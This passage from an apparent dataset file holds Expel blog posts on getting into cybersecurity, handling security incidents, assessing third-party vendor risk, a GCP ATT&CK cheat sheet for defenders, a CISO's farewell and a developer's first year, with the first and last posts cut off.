enormously long list of knowledge areas youll need to be proficient in. If thats the kind of job you want to do, it might make sense to start off with a less technically demanding role that has a lot of the same baseline prerequisites like an IT Program Auditor . You could use that as a stepping stone into other security roles as you develop a deeper understanding of the security space. And yes, you could certainly start with a role in Systems Administration or Network Operations to gain technical chops too. Wait a sec, you might be thinking to yourself, isnt this just a cop out by defining non-security roles as security? Yes, it absolutely is. You got us. Frankly, as the NICE Framework makes clear, security is extraordinarily broad. While some argue its niche, its really a compendium of niche knowledge across several vastly different work areas. That means if your mind (or your heart) is set on security, you can enter any of these domains and work your way into security. Or  you can start in security-specific domains and work your way into more technical roles over time. Okay, so maybe you buy into the argument that the security domain is pretty diverse. Maybe you go one step farther and believe several of these roles include security responsibility even if they dont have security in their title. After all, weve been saying that security needs to be built-in , not a bolt-on for years, right? Perhaps whats going on here is that the online brouhaha around entry-level security jobs is really focused on the security jobs where technical depth is essential. Maybe the argument is its these jobs that require starting out in technical non-security roles first. Lets poke at that a bit. But first, there are a few things thatll apply no matter what direction youre coming from. Lets try to agree on three things Anyone can cook Have you seen the movie Ratatouille ? No? Yeah, that seems to be the most common answer. Ok, lets summarize [SPOILER ALERT]. Theres this Chef, Auguste Gusteau, who authors  Anyone Can Cook . Throughout the movie, youre made to believe that the message of the book (and the movie) is that literally anyone can become a great chef. Even the protagonist, a rat, can do it because you can learn how to do it from a book. Yet, by the end of the movie, you realize the point is substantially more profound and realistic. Actually, no. Not everyone who picks up the book can become a great chef. But, in fact, a great chef could potentially come from anywhere. There are so many paths to success. There are exceptions to every rule. Anyone can cyber. Never is rarely the right word A few years ago one of us was walking up Main Street, USA at the Magic Kingdom. It was 8:30am and he refused to buy his younger daughter funnel cake first (oh, the humanity!) You never buy me anything! she exclaimed. He stopped. He looked around. He kept walking. The notion that you should avoid absolutes isnt new. And in the tech space, its particularly important. A great engineer and former colleague once said: When the customer says it never happens, we need to build support for it to happen 5-10% of the time. So were going to be cautious about these words when were talking about career paths too. Broad-scale discouragement is a Bad Thing When you engage in an argument or even a mild discussion, theres a decent chance your conversation partner is already coming to the table with an opinion. If its a strongly-held opinion, your counter-argument may actually galvanize their original belief . In that case, your discouragement is going to fall on deaf ears  so why bother? In other cases, people may have a more flexible mindset. Think about a scout versus a soldier mindset. To a soldier, everything is black and white. Good and evil. Kill or be killed. Compare that to a scout, whos in information gathering mode all the time. Drawing conclusions are some generals job. Discouragement, in this case, could actually be effective! So good job, youve managed to discourage a portion of the population who could actually have been amazing contributors in the field. What harm is there on succeeding or failing on ones own merit? Why encourage people to punt on first? Five habits that are helpful for (entry-level) security jobs If you dont agree with the three items above, well  it might be a good idea to stop reading now because were about to do some hardcore encouragement , and that might make you grumpy. After all, the next great information security practitioner could be reading this blog right now. Also, we promised in the title to explain how to get into cybersecurity. So here are a few practical next steps. There are all sorts of resources out there thatll help you on the path towards becoming a super-nerdy cyber superhero. Heres our list of five things you can do to take the first steps to an entry-level technical cybersecurity career. 1. Survey the field Follow influential cybersecurity evangelists on Twitter. The most successful ones probably arent calling themselves cybersecurity evangelists. Theyre just constantly dropping knowledge bombs, tips and tricks that can help your career. Heres a short list to get you going: @bammv , @cyb3rops , @InfoSecSherpa , @InfoSystir , @JohnLaTwC , @armitagehacker , @danielhbohannon , @_devonkerr_ , @enigma0x3 , @gentilkiwi , @hacks4pancakes , @hasherezade , @indi303 , @jackcr , @jenrweedon , @jepayneMSFT , @jessysaurusrex , @k8em0 , @lnxdork , @mattifestation , @mubix , @pwnallthethings , @pyrrhl , @RobertMLee , @ryankaz42 , @_sn0ww , @sroberts , @spacerog , @subtee , @taosecurity 2. Combine reading and practice This may shock you, but theres this security company called Expel that has a bunch of great content (full disclosure: were biased). Self-serving comments aside, there are several companies that produce high-value security content on a pretty regular basis. High on our list are CrowdStrike , Endgame , FireEye , Kaspersky , Palo Altos Unit 42 , and TrendLabs . As you read, try to figure out how youd go about detecting the activity they describe. Then, how would you investigate it ? Are you looking to grow your technical foundation for something like an analyst role? The breadth of what you need to know can be daunting. Perhaps the most foundational knowledge to pick up is around the TCP/IP protocol suite . Be prepared to answer the  what happens when  question confidently. For learning about endpoint forensics, you probably cant get a better foundation than Incident Response and Computer Forensics 3rd Edition . The chapter on Windows forensics is gold. Dive into Powershell , associated attack frameworks , and learn how to increase visibility into PowerShell activity with logging. Pair this knowledge with some of the best free training out there at Cobalt Strike. Watch the (most excellent) videos and apply the concepts youve learned as part of Cobalt Strikes 21-day trial. Not enough time? Consider making the investment. The Blue Team Field Manual and Red Team Field Manual round out our recommendations on this front. In parallel, set up a lab with Windows 7 (or later) workstations joined to a domain. Compromise the workstation using some of the easier techniques, then explore post exploitation activity. Your goal is to get a feel for both the attack and defense sides of the aisle here. On the network side, consider The Practice of Network Security Monitoring , Practical Packet Analysis , and Applied Network Security Monitoring . When it comes time to take some of this book learning and make it real, resources like the malware traffic analysis blog and browsing PacketTotal where you can get a sense for whats normal versus whats not. Your goal here should be to understand sources of data (network evidence) that can be used to detect and explain the activity. To refine your investigative processes on the network, consider Security Onion . Set up some network sensors, monitor traffic and create some Snort/Suricata signatures to alert on offending traffic. Your goal is to establish a basic investigative process and like on the endpoint side, understand both the attack and defense sides of the equation. 3. Seek deep learning, not just reading Have you ever taken a class and then months later tried to use the knowledge you allegedly learned only to discover youve forgotten all the important stuff? Yeah, if you disconnect learning from using the knowledge, youre going to be in a hard spot. This might be one of the biggest challenges in diving into a more technical security role up front. To help offset this, in addition to combining reading with practice, consider the Feynman technique . Never heard of it? Well, its easy to skim over bits and pieces you dont understand  but if you can distill it down into simple language such that others could understand it, then youll have understood it better in the process. Nothing helps you learn quite like teaching. 4. Develop a malicious mindset Years ago, a security practitioner was explaining how you can become a better defender by thinking like an adversary. The story came with some awkward (and humorous) interchanges. He walked into a hotel room with his family while on vacation, saw the unsecured dispenser installed into the shower wall and said out loud, Wow, it would be so easy to replace the shampoo with Nair! His family was horrified. To be clear: were not advocating that you replace shampoo with Nair, or similarly nefarious anti-hair products. And the concept of thinking like an attacker is not new. Eight years ago when Lance Cottrell was asked what makes a good cybersecurity professional, he said they put themselves in the shoes of the attacker and look at the network as the enemy would look at the network and then think about how to protect it. The best way to do that these days is by wrapping your head around the MITRE ATT&amp;CK framework . Its quickly becoming the go-to model for wrapping some structure around developing an investigative process and understanding where (and how) you can apply detection and investigation. You might want to familiarize yourself with it prior to doing extensive reading and then come back to it from time to time as needed. 5. Be dauntless Dont let your lack of knowledge stop you . There are organizations out there willing to invest in people with the right traits and a desire to learn. Apply for the job , even if you dont think youre qualified. Maybe you get a no. So what? Try again at a different company. Or try again at that same company later. Reading will only get you so far  applying your knowledge will get you to the next level. And guess what, remember that Feynman technique? Yeah, teaching that knowledge youve acquired to others will get you one level farther. Good luck, happy hunting! Finally  to those who say an IT background and deep technical skills will help you get a job in security, we say: We agree! And  To those you say security roles can be broad and you can use them to develop technical expertise over time, we say: We also agree! What we dont believe in is telling people we dont know that they cant do something without understanding their unique situation. There may be paths that are generally easier, or generally harder. But assuming you cant do something is headwind you dont need. Hopefully youve found some guidance here that gives you the push you need to consider an entry-level (or later) security job and youll apply. To that end, we say  best of luck!'}) (input_keys={'title'}),
  Example({'title': 'A cheat sheet for managing your next security incident', 'url': 'https://expel.com/blog/cheat-sheet-managing-next-security-incident/', 'date': 'Aug 24, 2017', 'contents': 'Subscribe  EXPEL BLOG A cheat sheet for managing your next security incident Tips  5 MIN READ  BRUCE POTTER  AUG 24, 2017  TAGS: Planning / Security Incident Surviving the unexpected. On the face of it, security is pretty straightforward. Were operating in one of two modes. In Mode A were focused on keeping evildoers at bay (and other generally bad things from happening). In Mode B the bad things have happened and were doing the best we can to manage them. For most people A &gt; B. But we dont get to choose when the bad guys show up. When they do , were often out of practice because we have so much less experience responding to attacks than we do preparing for them. In a perfect world, theres a comprehensive incident response plan that involves legal, communications, the board, and technical response processes. In an even more perfect world, youve put that plan through a table-top exercise, refined it based on your learnings, and drilled it to the point of muscle memory. But few of us live in that perfect world. Thats OK. All is not lost. If you havent yet got that perfect incident plan in place you can still make the best of a bad situation and manage your organization back on level ground. Here are six things I recommend. 1. Control your emotions and the velocity First and foremost, its important not to freak out. Your job is to manage the incident in front of you and return the organization to normal. Letting your emotions get the better of you will just get in the way of reaching that goal. It may be difficult to settle your emotions, but there are ways to help. First, get organized by putting a set of facts and tasks together to help you focus on the event at hand rather than the emotions surrounding it . Also, take care of yourself. Eat. Rest. Dont be afraid to take a step back (or a walk around the block) once in a while. It will help you maintain perspective and control your emotions. Pace of response is also important. You need to drive response activities but  like Icarus  youll only be successful if you stay away from the extremes. Move too fast and youll have wasted work, missed opportunities and poor decisions that could make you look like the Keystone Cops . Move too slowly, and youll jeopardize the integrity of your organization as attackers continue to have access and do damage. Theres no clear rule of thumb here, but as each meeting goes by and each day passes, make sure youre thinking about the velocity of activities and adjust tasking appropriately. 2. Build a team and assign roles You cant respond to an incident all by yourself. No matter how big or small your organization is, you need help. Build a team thats appropriate for the response and assign everyone discrete roles. Without roles, youll have people stepping on each others toes and gaps where there should be work. Youll want to engage legal, communications, key executives, IT leaders and technical staff. Make sure each person knows what theyre expected to do, the level of effort and the need for confidentiality. But be careful. Dont bring in too many people  especially if youre dealing with an insider incident. Controlling information gets harder as more people get involved. So, think carefully about who you involve when insiders are involved. 3. Communication is key Regular meetings are important to keep everyone on the same page. Youll be bringing together individuals from across the organization. They dont normally work together and they wont be familiar with each others communication styles or skills. By meeting at least once or twice a day, youll help the team integrate rapidly and ensure your response activity doesnt suffer from lack of information sharing. And while internal communication is critical, make sure youre also looking beyond your own four walls to your customers, vendors, board, and the public at large. Controlling the message while an incident is unfolding is difficult. And it shouldnt be your responsibility  not just because youre busy, but because you are probably not good at it. Being transparent but also communicating facts externally in a way that is consistent with your brand is complicated. Educate your communications staff about the incident and hold them accountable to message with the appropriate parties. 4. Dont jump to conclusions Nothing is worse than a public statement about an incident that later has to be completely changed because an organization made an assumption during an incident that turns out to be false. I was once pulled away from a vacation with my family because my corporate website was under attack according to our network operations center. We spent half a day working with that hypothesis, trying to shore up our DDoS defenses and control traffic. When we actually stepped back and looked at the facts, we discovered our marketing department had launched a new ad campaign without telling IT. It was swamping us with new users. Within a few minutes, we contacted marketing and had them turn the dial down to levels our infrastructure could handle. Deal with the facts you have, not the facts you want or the assumptions you brought to the table. Jumping to conclusions without sufficient facts damages your creditability with stakeholders. More important, it can lead to poor assignment of resources and cause greater harm to your organization as attackers are allowed continued room to operate. 5. Save the post-mortem for the actual post While youre figuring out what happened, its often easy to drift into thinking about why it happened. Assigning blame and tracking down the root cause of an incident may seem like a good idea, but it can inflame emotions and distract you from the task at hand. If you see your teammates diving into the why of the incident, remind them that the team will do a post-mortem after the incident and ask them to stay focused on their tasking. Usually, the promise of the post-mortem is enough to keep things on track. Then, once the incident is resolved, make sure you actually do the post-mortem analysis. Addressing the root cause of an event is important to the long-term integrity of your organization. Give everyone a few days to rest and deal with their normal job functions, but try to have a post-mortem meeting within a week after the event. 6. Start building a real incident response plan When the dust has settled, sit down with all your notes, emails, and random facts. Marvel that you were able to deal with such a complex situation with nothing but your wits and your skills. And vow to never, ever do it like that again. Creating a solid incident response plan will ensure that when things go wrong again (and they will go wrong) that your organization is better prepared to deal with the event. Did you notice something? None of these recommendations are overly technical. In my experience, when incident response goes wrong its not because there wasnt competent technical staff. Its because there was no clear leadership for the staff to follow.  So today, while youre still working on your full incident response plan (and before anything bad has happened) let me offer a three-minute plan and a three-hour plan that will leave you better prepared to manage your organization the next time you face an incident. If youve only got three minutes: get your phone out, make a list of the people across the organization that youll need to work with if an incident happens and make sure you have them on speed dial. If youve got three hours go a step further: set up meetings with each of them and tell them what their role would be if an incident ever arises. Trust me, the time you spend doing this will be paid back tenfold when that time is most valuable  during your next incident.'}) (input_keys={'title'}),
  Example({'title': 'A common sense approach for assessing third-party risk', 'url': 'https://expel.com/blog/a-common-sense-approach-for-assessing-third-party-risk/', 'date': 'Jul 26, 2018', 'contents': 'Subscribe  EXPEL BLOG A common sense approach for assessing third-party risk Security operations  12 MIN READ  BRUCE POTTER  JUL 26, 2018  TAGS: Example / How to / Planning How secure is your supply chain? Its a question that can strike terror into the heart of a CISO  even one whos in charge of a mature security organization. With the move (sprint?) to cloud-based infrastructure, and business departments subscribing to SaaS apps left and right (Oops! was I supposed to tell IT?), every day we rely more and more on other peoples services to serve our customers. Here at Expel, were a cloud first organization. Our entire enterprises physical infrastructure fits easily on one desk. But we use the capability of nearly 50 vendors to bring our services to our customers. Thats a lot of infrastructure thats not ours. And were a relatively small company. Large companies may depend on hundreds of outside services. Understanding how all those services keep their customers (meaning  you) secure is no trivial matter. But its super important. CISOs manage cyber risk in their own infrastructure every day. But once you leave your own infrastructure, it gets harder. And there arent a lot of playbooks for how to manage the risk of someone elses infrastructure. Third parties are out of your control. You give them money, they provide a good or service in return. Sometimes, theres even contractual language that says well do our best to secure your data. But, in practice, those words dont really mean much. What matters is the practices, procedures, and policies your vendors follow. At Expel, like many companies, weve created a third-party assessment program for our vendors to try to manage our supply chain risk. Weve used other companies third-party assessment programs as input, consulted our vendors and done a lot of research. It works well for us, and so were sharing it with you, along with the third-party risk assessment questionnaire weve developed. Watch the video overview  or keep scrolling to read on First  be realistic about who chooses your suppliers Unfortunately (at least for CISOs), security doesnt control who the organization does business with. Business owners do. And the questions they have on their mind are very different than what most CISOs are wondering. As you roll your program out, its important to understand the business owners mindset so you can figure out when, where and how to insert your own process into theirs. When a business owner has a problem, they probably want to fix it fast. They want to know if the product or service theyve got their eye on will do the trick. If the answer is yes (and theyve got the budget) theyll move forward, negotiating contracts, agreeing on cost and ultimately making the purchase. Meanwhile, the CISO is thinking, Does this vendor create an acceptable level of risk? Getting answers means acting fast  while the business owners are chasing down answers to their own questions. If a potential vendor doesnt address security in a way youre comfortable with, the sooner you know that the better. Its much easier to guide the business away from potentially toxic companies early in the process than to stop a contract thats gone through all the redlining and negotiation and is one inch from the finish line. Next  set realistic expectations (aka understand the constraints) Setting realistic expectations for your third-party assessment program requires understanding two important equations thatll govern how much time you and your vendors are willing to put in. They seem simple. But its easy to get so caught up in the weeds perfecting your process that you lose sight of them. Violate equation number one and vendors will start stretching the truth to get through all of your questions or bury the bad stuff to try and get your business. Violate the second equation and youll find yourself giving away a free risk assessment or pen test to every potential vendor (more on that later). Remember, SaaS providers are getting bombarded left and right with third-party assessments. Short, easy questionnaires will get their attention before long complex ones. Likewise, you dont have a lot of time to dedicate to this either. The more complex the questions, the longer youll have to spend vetting the results. Short, simple and to the point is far more likely to get to a result thats useful  both for you and your vendors  than some crazy, multi-page questionnaire. Keeping things simple has multiple benefits. When in doubt, use the 50 at 50 rule Striking the balance between thorough yet brief, reminds me of a saying from when I used to crew for a friend that raced cars out in West Virginia. The sanctioning body for the races required that cars be painted in a professional manner. Anyone thats been around amateur racing knows that very little about it qualifies as professional. The rule of thumb the officials used was 50 at 50 that is, when you looked at a car traveling 50 miles per hour from 50 feet away, did the car look like it was painted? If the answer was yes, you were good to race. Thats sort of how I view third-party assessments. If your process gives you the same level of assurance about your vendors security processes as 50 at 50 gives racing officials, youre doing things right. Sure, there are some situations that require far more diligence than that (stay tuned!), but in most cases, youre just trying to get a general feel for things. Ultimately, even organizations with great practices and procedures will screw up sometimes. Nothing you do in your third-party assessment program will change that. The common sense process for third-party assessments There are three big chunks to any third-party assessment program: creating the questionnaire, designing the process and running it (told you it would be common sense). Of course, not every situation will fit neatly into your process. Well cover the outliers too. But, to get started, you need to create your questionnaire. 1. Creating your questionnaire The questions you ask your vendors will be taken seriously by them  or at least theyll look at them seriously and try to figure out what you mean. Its important to write crisp, clear questions that vendors can easily understand and have a clear way to answer. The meat of your questionnaire is the questions themselves. Were providing our third-party risk assessment questionnaire as a starting point for you. Hopefully thisll let you speed through this step. We like these questions because they cover a wide swath of cybersecurity without being too detailed. Theyre also aimed at making it easy for vendors to re-use work theyve already done. Asking about existing certifications and the results of previous testing reduces friction in the process. Really, we want to ask questions we think will get answered truthfully and quickly. Focusing on reuse is one strategy for that. Weve also designed our questionnaire to sleuth out how much thought and care a vendor has put into security in general. For example, when we ask Do you have a formally appointed information security officer? we get a different vibe when the answer is Yes, heres our CISOs contact info, versus Not really. Our lead developer cares a lot about security though. Simple questions like this give you a great window into how a potential vendor thinks about security. 2. Building the process Developing the questions is only one piece of the prep work that youll need to do. How youre actually going to manage the process is equally important. The process weve designed breaks down into the following six steps. Your exact process will, no doubt, have to be tailored a bit to the way your organization buys products and services. Were not suggesting that you can do a direct cut-and-paste of our process. But hopefully it can be an advanced starting point for you. Heres a quick overview of how we thought about each step as we created our own third-party assessment process. Step 1: Kicking off the process We created a set of criteria to determine which external vendors need to go through the process. Vendors that make the cut include: Services that will impact production systems Services that contain customer or other sensitive data Systems which aggregate data from multiple data sources. If someone is trying to use a new service that fits one of these situations, they send a request for review to a security review email alias containing what the service is, how were going to use it and provide points of contacts at the vendor. Step 2: Send an introduction Its a bit awkward to send an email to a potential vendor demanding a bunch of information without first introducing yourself, the process and what they should expect. At Expel, the first thing we send to the vendor is a cordial email describing our process, the relatively casual and light touch nature of it and an invitation to ask questions or engage if they have concerns. We also let them know our desired timeliness (usually we ask for a response within about two weeks). Step 3: Send the real email Next, we send the real email. We use our secure file sharing system to send this email so that all communications are encrypted and their response is protected on its way back to us. You dont have to do this, but its advisable, especially if youre asking for copies of sensitive documents such as their SOC2 and pen test executive reports. Step 4: Send a reminder After a week and a half has gone by, well send a gentle reminder if we havent heard anything. Thats usually enough prodding to get us answers right under our two week request. Step 5: Receive and analyze the results Hopefully, when you get the vendors answers back they make sense, are reasonably complete and if youre lucky theyre even comprehensible. Sometimes weve had to go back to ask vendors for clarification on an answer or two, and thats OK. Keeping in mind the 50 at 50 mentality, once you have the answers, balance them against the business request and determine if youre willing to move forward with the vendor or if there are concerns that need to be addressed. Step 6: Brief the business owner(s) Once weve got our heads around all of the vendors answers, we give the business owner our opinion. When the results are positive, the conversations are easy. When we have concerns, thats when things get more difficult. Its a good idea in those cases to involve more people on the business side than just the requester (team leads, managers, etc.). Youre going to get into a risk-oriented decision about how important this specific vendor is to the company and what the security risks are. The results of that meeting can vary wildly, but usually will fall into one of four buckets: Yep. Cool. Go for it. We can put in compensating controls to make up for lack of assurance in the vendor. We need a deeper dive to better understand the risks. No. Nope. Negative. Not going to use them. Its very important not to treat these decisions as binary. The reason youre doing a third-party assessment in the first place is to manage risk. Risk is a continuum, as it were, and you should treat your third-party vendor assessment process the same way. 3. Running the process Once youve got your questionnaire and process figured out, test it on a few vendors. Be very up-front with them; let them know this is your first time trying out your third-party vendor assessment questionnaire and youd love feedback on both the material itself and the overall process. Youll find some vendors are well prepared for these kinds of requests and will have a team dedicated to answering them. Other vendors will respond with huh, this is the first time anyones asked us about security. Be prepared for that and everything in between. Take any feedback you get and stir it inappropriately with the work youve already done and your objectives for your third-party assessment program. After youve tested the process on a few vendors (or later  run the process for a year or two), iterate. Feel free to change it up. As you grow, your risk appetite changes. As the state of the art of your vendors improves, you might want to modify your process to suit your needs. You dont need a forever apples to apples comparison over the years. Rather, you need each response to provide you the information you need right now to make the decision thats in front of you. That information will change over time, and your process should too. Keeping track of the results Youll likely get lots of confidential documents back from your vendors when they reply to your questionnaire. Youll want to make sure you protect them according to the terms of any non-disclosure agreements you signed with them. Be sure to follow whatever your internal procedures are with respect to protecting that information. Also, weve found that its helpful to create one place to track all of the assessments  upcoming requests, active ones, and assessments weve completed. We store all the responses, supporting documents and our notes in one place. Weve chosen Confluence for that since we use the Atlassian suite for a lot of our engineering and security workflow already. You should choose whatever makes sense in your organization. But be aware, youll build up quite a pile of information quickly, so being organized early will pay off as your program grows. Hooking the process into the way your organization buys stuff Having a process is all well and good. But, unless you socialize it and have a clear way to plug it into the way your organization buys stuff, your third-party assessment program can quickly turn into shelfware. Its important to set the hook early in the process to get the best results. That hook can take many shapes: The procurement process: When a business unit requests a new PO, your purchasing department can simply ask, What does Security think of this? Knowing a PO wont be cut unless theres a clear answer to that question will force business owners to engage your process early so youre not playing catch up. Contract review: A slightly different take, but the same basic idea. When a contract is put in front of legal to review, they can ask, What does Security think of this? as well. Again, if business owners know they cant get through legal without clearing security, theyre going to engage you early. Thats just the way it is: Rather than have a specific gate, you can communicate with leaders and purchasers that new products and services are subject to a third-party assessment as part of doing business. If its discovered that someone bought something without an assessment, There Will Be Consequences. Just like there are when people buy product outside of purchasing, right? Right? Whatever you decide, be sure to communicate it widely and often. New processes that affect how you buy services tend to take a while for everyone to understand and accept, so putting together a good PR campaign cant hurt your cause. Also, be sure the how to submit part of your process is clear. At Expel we use Jiras Service Desk as the portal where users can submit third-party assessment requests and track progress. We already use Service Desk for IT and other ticket tracking so it was an easy solution. YMMV and all that be sure to choose a method of engagement that works for you and your company. Vendors that are bigger than your breadbox There may be times when the product or service youre evaluating is too big, too important or represents too much risk to apply the 50 at 50 rule. In these cases, youll likely end up doing a more formal risk assessment to understand the risks they present in more depth so you can compensate for any issues you cant get the vendor to fix. Risk assessments are complicated (I addressed them in an OReilly Security talk here if youre interested). They can be done either by your own staff or a third party. Either way, I have two points of caution: Dont give out a free pen test If you engage a third party to assess your vendors product its easy for your vendor to ultimately get a free pen test that you unwittingly pay for. So, if you hire a third party, make sure theyre working on your behalf and use your business needs as the backstop for their work. Thatll make sure the final product is geared towards you and your business, not the vendor and their product. Make sure you dont accidentally do a pen test or risk assessment The other common mistake when you dive deeper is you dont realize that youre diving deeper. You get the questionnaire back and you have questions  so you ask the vendor a few more questions. Things are clearer, but still not clear. So, you ask Hey, can we take it for a test drive? You get their product, configure it, start testing it and suddenly realize youre doing a product assessment and youre already 40 hours into the process and probably have 80 more hours to go before youre done. As you start peeling back the onion be aware that youre doing it overtly and for a reason. Dont spend more time and effort on a third-party assessment than you need to. Oh  and make sure to avoid these common pitfalls Finally, there are a couple of other pitfalls youll want to make sure you avoid as you launch (or refine) your third-party vendor assessment program. Adding to the questionnaire Be wary of asking too many questions or diving too deep. Youll quickly reach a point where vendors dont want to answer and it takes you too long to assess the results. Its not worth it. If you decide to do a full-fledged risk assessment, then by all means, dive in the deep end. But if youve got a question you feel you must add to your questionnaire, find one (or two?) that arent giving you any value and swap them out. Again, the simpler and shorter your questionnaire is, the more likely youll get accurate and timely responses. Believing all the answers Its human nature to not want to fail tests. That applies to vendors responding to third-party assessment requests. They want to be as compliant as possible, so you can expect theyll take a few liberties in their answers. While its unusual to find a vendor that flat out lies (saying theyre SOC2 Type 2 compliant when theyre not, for example), you may find vendors occasionally stretch the truth enough to pass. So, when youre answering the question Am I OK using this vendor, assume their answers are eighty percent correct. Thats it There you go. Thats Expels third-party vendor assessment program in a nutshell. There are many like it, but this one is ours. Hopefully it gives you a jump start on building your own program. Please, take a look at our questionnaire , and feel free to use, modify, and comment on it as you see fit. Id also suggest taking a look at our NIST cybersecurity framework self-scoring tool that I created. It allows you to create charts that show your current and future security posture based on the NIST CSF and it includes a section on supply chain risk. If you do have comments and youd like to share on this process, the questionnaire or the NIST tool, please reach out to us and let us know. Were always trying to improve and would love for you to help us with that.'}) (input_keys={'title'}),
  Example({'title': "A defender's MITRE ATT&amp;CK cheat sheet for Google Cloud ...", 'url': 'https://expel.com/blog/mitre-attack-cheat-sheet-for-gcp/', 'date': 'Aug 5, 2022', 'contents': 'Subscribe  EXPEL BLOG A defenders MITRE ATT&amp;CK cheat sheet for Google Cloud Platform (GCP) Security operations  2 MIN READ  KYLE PELLETT  AUG 5, 2022  TAGS: Cloud security / MDR Our security operations center (SOC) sees its share of attackers in Google Cloud Platform (GCP). Seriouslycheck out this recent incident report to see what we mean. Attackers commonly gain unauthorized access to a customers cloud environment through misconfigurations and long-lived credentials100% of cloud incidents we identified in the first quarter of 2022 stemmed from this root cause. As we investigated these incidents, we noticed patterns emerge in the tactics attackers use most often in GCP. We also noticed those patterns map nicely to the MITRE ATT&amp;CK Framework  (See where were going with this?) Cue: our new defenders cheat sheet to MITRE ATT&amp;CK in GCP. Whats inside? In this handy guide, we mapped the GCP services where these common tactics often originate to the API calls they make to execute on these techniques, giving you a head start on protecting your own GCP environment. We also sprinkled in a few tips and tricks to help you investigate incidents in GCP. Its an easy-to-use resource that informs your organizations GCP alert triage, investigations, and incident response. Our goal? Help you identify potential attacks and quickly map them to ATT&amp;CK tactics by providing the lessons learned and takeaways from our own investigations. Depending on which phase of an attack youre investigating, you can also use the cheat sheet to identify other potential attack paths and tactics the cyber criminal used, painting a bigger (clearer) picture of any risky activity and behaviors that can indicate compromise and require remediation. For example, if you see suspected credential access, you can investigate by checking how that identity authenticated to GCP, if theyve assumed any other roles, and if there are other suspicious API calls indicating the presence of an attacker. Other tactics that an attacker may execute prior to credential access include discovery, persistence, and privilege escalation. Whats the bottom line? Chasing down GCP alerts and combing through audit logs isnt easy if you dont know what to look for (and even if you do). Full disclosure: the cheat sheet doesnt cover every API call and the associated ATT&amp;CK tactic. But it can serve as a resource during incident response and help you tell the story (to your team and customers) after the fact. Knowing which API calls are associated with which attack tactics isnt intuitive, and we dont think you should have to go it alone. We hope this guide serves as a helpful tool as you and your team tackle GCP incident investigations. Want a defenders cheat sheet of your own? Click here to get our GCP mind map! P.S. Operating in Amazon Web Services (AWS) or Azure too? We didnt forget about youcheck out this AWS Mind Map and Azure Guidebook for more helpful guidance. Special thanks to Ryan Gott for his contributions to this defenders cheat sheet and mind map.'}) (input_keys={'title'}),
  Example({'title': 'A tough goodbye', 'url': 'https://expel.com/blog/a-tough-goodbye/', 'date': 'Aug 10, 2021', 'contents': 'Subscribe  EXPEL BLOG A tough goodbye Expel insider  2 MIN READ  BRUCE POTTER  AUG 10, 2021  TAGS: Company news After nearly five years serving as Expels CISO (pronounced ciz-oh, for those wondering), Im moving on to new adventures. But before I leave, I wanted to share a bit about my journey with Expel. Expel is an incredible company. I honestly mean that. Even from the beginning, Expel impressed me. In 2016, I had the opportunity to be the technical advisor to the Obama administrations Commission on Enhancing National Cybersecurity. It was a fascinating experience, to be sure. One of the things I heard from all the companies and agencies I interacted with was that many of them had a similar shared experience that can be best summed up like this: Ive done everything Im supposed to do and bought all the tech Im supposed to buy. I still dont feel like I see whats happening in my environment, and dont think my provider is actually finding the bad things. At the time, I remember thinking, Yep, thats how it is, and I didnt have any real ideas on how to do better. How it started I got a call from Yanek, one of Expels founders, who was on the hunt for a CISO for this new company he was helping to start and was hoping I might have some recommendations. Always happy to help a friend, I asked him what Expel was doing and told him Id see if I could find anyone who might be interested. He told me the plan for Expel: The founders wanted to disrupt the managed security space, hook into existing investments companies have made and automate not just the detection but also the investigative and recommended remediation activities. After listening to the pitch, I thought, Thats it! Thats the thing nearly everyone Ive talked to in the last year needs. I offered up that Id be willing to be Expels CISO. I interviewed with the other execs (including a really memorable one with Pete Silberman), and I ended up with the jobeven if we couldnt agree on how to pronounce C-I-S-O. How its going Fast forward almost five years, and its been a blast. Seeing the initial vision of the company come to fruition is awesome. Ive had customers tell me our service has changed their lives; that they finally get to see their kids sporting events for the first time in foreverIve seen companies grow and build their internal security programs without having to deal with the day-to-day stress of security operations. And Ive seen Expel grow too. This company has always been an incredible place to work, a place where everyone supports each other both professionally and personally. In my role as CISO, I oversee not just security, but IT and facilities as well. I cant overstate the quality of work done by this team. Weve published some of the work weve done (like our 3PA process , the NIST CSF self-scoring tool and NIST Privacy Framework self-scoring tool ) but theres lots of good work this team has done that the public doesnt get to see. Im thankful for them and so proud of their work. Although Im off to a new adventure and excited about the future, its safe to say Ill miss Expel and its band of merry Expletives. Thanks and see you around To our customers: Im happy weve been able to make a difference for you. To my coworkers, Ive enjoyed working with all of you and youve made me a better person during my time at Expel. And to my family, thanks for your support on this adventure and the next one. Im not going far  if you want to chat about third-party risk (thats a great topic for cocktail parties, by the way) or just say hello, you can still find me in your favorite CISO Slack community, at ShmooCon and on Twitter.'}) (input_keys={'title'}),
  Example({'title': "A year in review: An honest look at a developer's first 12 ...", 'url': 'https://expel.com/blog/developers-first-12-months-at-expel/', 'date': 'Aug 16, 2022', 'contents': 'Subscribe  EXPEL BLOG A year in review: An honest look at a developers first 12 months at Expel Talent  8 MIN READ  DAREN MCCULLEY  AUG 16, 2022  TAGS: Careers / MDR At Expel, it should be no surprise that we value transparency. Its one of those core beliefs that makes us tick. One way we practice transparency is by providing open and candid insights into our interview and onboarding process, but what about beyond the first 90 days? Well, lets talk about itbecause thats what we do here. Recently, senior software engineer, Daren McCulley, used his Expel-oritory Timemore on this laterto reflect on his first year as a new developer at Expel. In this post, learn about Darens experience with the interview process, major takeaways from the early days, and the personal and professional growth that came along the way. The goal? We hope that providing a peek behind the curtain will help you make the most informed decision when deciding if becoming an Expletive is right for you. Take it away, Daren! Lets start at the beginning When I think back to the interview process with Expel, what I remember most is that I was never in the dark about what was next or where I stood. In contrast to the other interviews Id been through, the process was transparent, respectful of my time, and gave me a window into Expels culture. Our technical interviews are collaborative experiences, rather than inquisitions by whiteboard. It only took two weeks to go from my initial screen to my final interview, and my recruiter extended an offer that same eveningallowing me plenty of time to compare it with offers from other companies. The thoughtfulness given to my personal circumstancesunderstanding that I needed to weigh all of my options to make the best choice for mewas the first of many times Ive witnessed Expel demonstrate another core belief: If we take care of our crew, theyll take care of our customers. At the risk of stating the obvious, I accepted my offer. What to expect in the early days At Expel, we definitely hit the ground runningbut dont expect to go it alone. In your first week, you can expect to commit code to production (from the comfort of your own home), but a group of people will come together to make it happen. Itll go something like this: Prior to day one, youll get a new laptop, monitors, keyboard, trackpad, and dock in the mail. Youll also have access to some discretionary funds to make your home office sparkle. Darens home office setup On your first day, someone from IT will guide you and other new Expletives through laptop and account setup. IT works hard to make this a fairly painless process, so things will probably work out of the box (if they dont, IT is always just a Slack message 